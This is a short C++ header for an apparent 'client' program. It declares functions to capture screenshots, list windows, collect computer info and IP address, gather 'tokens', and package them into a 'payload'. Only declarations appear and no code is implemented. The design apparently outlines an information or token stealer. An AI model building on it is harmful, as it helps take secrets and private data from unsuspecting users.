#pragma once
#include <string>

namespace client {
	namespace functions {
		std::vector<std::string> get_all_windows();

		void take_screenshot(std::string file);

		std::string get_computer_info();

		std::string get_ip();

		std::vector<std::string> get_tokens();

		std::string prepare_payload(std::string title, std::vector<std::string> tokens);
	}
}